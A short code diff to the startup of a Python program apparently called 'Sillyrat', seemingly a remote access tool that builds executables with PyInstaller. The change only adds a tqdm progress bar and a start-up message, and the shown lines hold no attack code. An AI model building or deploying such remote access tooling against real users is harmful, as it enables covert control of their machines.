@@ -2,6 +2,7 @@ import sys
 import os
 import socket
 import time
+from tqdm import tqdm
 import base64
 import tabulate
 import signal
@@ -12,6 +13,10 @@ import threading
 import platform
 import PyInstaller.__main__
 from datetime import datetime
+
+print ("Starting Sillyrat...")
+for i in tqdm(range(10)):
+    time.sleep(0.1)
 
 __LOGO__ = """
  ____  _ _ _       ____      _  _____
